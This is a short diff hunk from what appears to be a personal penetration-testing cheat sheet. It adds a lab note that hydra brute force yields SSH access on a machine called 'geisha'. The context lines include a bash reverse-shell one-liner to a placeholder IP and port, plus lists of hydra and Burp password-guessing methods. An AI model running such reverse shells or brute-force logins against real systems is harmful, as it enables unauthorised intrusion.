@@ -258,6 +258,7 @@ bash -i >& /dev/tcp/<ip>/<port> 0>&1  (first convert base64)
 Brute
 
 Login hydra (especially if you have username) 
+Consider geisha - 4 websites, 1 username, all rabbit-holes.. hydra gets SSH
 Burp Pw Guess (even with protections) 
  
 =================================== 
